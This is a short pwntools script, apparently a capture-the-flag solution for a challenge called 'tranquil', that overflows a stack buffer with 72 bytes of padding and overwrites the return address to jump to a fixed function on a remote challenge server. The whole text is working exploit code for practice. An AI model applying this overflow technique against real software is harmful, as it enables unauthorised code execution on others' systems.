from pwn import *
filename = "./tranquil"
#io = process(filename)
io = remote("shell.actf.co", "21830")

payload = b"A"*72
payload += p64(0x401196)
io.sendlineafter(":", payload)
io.interactive()
